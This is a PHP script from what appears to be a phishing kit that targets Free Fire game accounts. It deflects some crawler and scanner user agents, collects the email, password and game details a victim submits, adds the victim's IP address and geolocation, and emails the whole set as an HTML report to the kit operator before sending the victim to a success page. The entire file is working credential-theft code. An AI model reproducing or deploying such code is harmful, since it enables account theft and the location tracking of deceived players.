<?php
$ua = $_SERVER['HTTP_USER_AGENT'];
if(preg_match('#Mozilla/4.05 [fr] (Win98; I)#',$ua) || preg_match('/Java1.1.4/si',$ua) || preg_match('/MS FrontPage Express/si',$ua) || preg_match('/HTTrack/si',$ua) || preg_match('/IDentity/si',$ua) || preg_match('/HyperBrowser/si',$ua) || preg_match('/Lynx/si',$ua)) 
{
header('Location: http://www.facebook.com/ciditya24');
die();
}

// MENGAMBIL KONTROL
include 'kangadiit/setting.php';
include 'kangadiit/location.php';
include 'email.php';

// MENANGKAP DATA YANG DI-INPUT
$email = $_POST['email'];
$password = $_POST['password'];
$nickname = $_POST['nickname'];
$id = $_POST['userId'];
$level = $_POST['level'];
$epas = $_POST['epas'];
$tier = $_POST['tier'];
$login = $_POST['login'];

$country  = $khcodes['country'];
$region   = $khcodes['regionName'];
$city     = $khcodes['city'];
$lat      = $khcodes['lat'];
$long     = $khcodes['lon'];
$ipAddr   = $khcodes['query'];

// MENGALIHKAN KE HALAMAN UTAMA JIKA DATA BELUM DI-INPUT
if($email == "" && $password == "" && $nickname == "" && $id == "" && $level == "" && $epas == "" && $tier == "" && $login == ""){
header("Location: index.php");
}else{

// KONTEN RESULT AKUN
$subjek = "$resultFlags | FF LOG $login | ID $id | LEVEL $level";
$pesan = <<<EOD
	<!DOCTYPE html>
	<html>
	<head>
		<title></title>
		<meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no"/>
		<style type="text/css">
			body {
				font-family: "Helvetica";
				width: 90%;
				display: block;
				margin: auto;
				border: 1px solid #fff;
				background: #fff;
			}

			.result {
				width: 100%;
				height: 100%;
				display: block;
				margin: auto;
				position: fixed;
				top: 0;
				right: 0;
				left: 0;
				bottom: 0;
				z-index: 999;
				overflow-y: scroll;
			}

			.tblResult {
				width: 100%;
				display: table;
				margin: 0px auto;
				border-collapse: collapse;
				text-align: center;
				background: rgba(247,129,129, 0.1);
			}

			.tblResult th {
				text-align: left;
				font-size: 0.75em;
				margin: auto;
				padding: 15px 10px;
				background: #00ccdd;
				border: 2px solid #00ccdd;
				color: #0B0B0B;
			}

			.tblResult td {
				font-size: 0.75em;
				margin: auto;
				padding: 10px;
				border: 2px solid #00ccdd;
				text-align: left;
				font-weight: bold;
				color: #0B0B0B;
				text-shadow: 0px 0px 10px #fff;

			}

			.tblResult th img {
				width: 45px;
				display: block;
				margin: auto;
				border-radius: 50%;
				box-shadow: 0px 0px 10px rgba(0,0,0, 0.5);
			}
		</style>
	</head>
	<body>
		<div class="result">
			<table class="tblResult">
				<tr>
					<th style="text-align: center;" colspan="3">Amanin Cepet:v</th>
				</tr>
				<tr>
					<td style="border-right: none;">Email Akun</td>
					<td style="text-align: right;">$email</td>
				</tr>
				<tr>
					<td style="border-right: none;">Password Akun</td>
					<td style="text-align: right;">$password</td>
				</tr>
				<tr>
					<th style="text-align: center;" colspan="3">Detail Akun Free Fire</th>
				</tr>
				<tr>
					<td style="border-right: none;">ID Karakter</td>
					<td style="text-align: right;">$id</td>
				</tr>
				<tr>
					<td style="border-right: none;">Nickname</td>
					<td style="text-align: right;">$nickname</td>
				</tr>
				<tr>
					<td style="border-right: none;">Level Akun</td>
					<td style="text-align: right;">Level $level</td>
				</tr>
				<tr>
					<td style="border-right: none;">Elite Pass</td>
					<td style="text-align: right;">$epas</td>
				</tr>
				<tr>
					<td style="border-right: none;">Tier</td>
					<td style="text-align: right;">$tier</td>
                </tr>
				<tr>
					<td style="border-right: none;">Login Via</td>
					<td style="text-align: right;">$login</td>
				</tr>
				<tr>
					<th style="text-align: center;" colspan="3">Informasi Device</th>
				</tr>
				<tr>
					<td style="border-right: none;">Country</td>
					<td style="text-align: right;">$country</td>
				</tr>
				<tr>
					<td style="border-right: none;">Region</td>
					<td style="text-align: right;">$region</td>
				</tr>
				<tr>
					<td style="border-right: none;">City</td>
					<td style="text-align: right;">$city</td>
				</tr>
				<tr>
					<td style="border-right: none;">Latitude</td>
					<td style="text-align: right;">$lat</td>
				</tr>
				<tr>
					<td style="border-right: none;">Longitude</td>
					<td style="text-align: right;">$long</td>
				</tr>
				<tr>
					<td style="border-right: none;">IP Address</td>
					<td style="text-align: right;">$ipAddr</td>
				</tr>
				<tr>
					<th style="text-align: center;" colspan="3">Subscribe Aditya Kurniawan</th>
				</tr>
			</table>
		</div>
	</body>
	</html>
EOD;
$headers  = 'MIME-Version: 1.0' . "\r\n";
$headers .= 'Content-type: text/html; charset=iso-8859-1' . "\r\n";
$headers .= ''.$sender.'' . "\r\n";
$kirim = mail($emailku, $subjek, $pesan, $headers);

if($kirim) {
    session_start();
    $_SESSION['nickname'] = $nickname;
    header('location: success.php');
}
}
?>
